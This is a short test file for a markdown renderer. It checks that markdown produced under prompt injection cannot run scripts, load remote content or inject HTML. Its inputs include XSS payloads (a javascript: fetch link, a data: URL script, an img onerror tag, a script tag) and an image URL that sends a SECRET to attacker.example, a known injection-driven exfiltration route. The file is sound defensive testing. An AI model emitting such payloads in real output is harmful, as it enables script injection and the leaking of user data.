import { expect, test } from "bun:test";
import { renderMarkdown } from "./markdown";

test("prompt-injected markdown can't run script, load remote content, or inject HTML", () => {
  const out = renderMarkdown(
    [
      "[click](javascript:fetch('/api/sessions'))",
      "[data](data:text/html,<script>alert(1)</script>)",
      "![badge](https://attacker.example/p?d=SECRET)",
      "<img src=x onerror=alert(1)>",
      "<script>alert(1)</script>",
      '[ok](https://example.com "t")',
    ].join("\n\n"),
  );
  expect(out).not.toContain("javascript:");
  expect(out).not.toContain('href="data:');
  expect(out).not.toContain("<img");
  expect(out).not.toContain("<script");
  expect(out).toContain('<a href="https://example.com" target="_blank" rel="noopener noreferrer nofollow" title="t">ok</a>');
  expect(out).toContain("[image: badge");
});
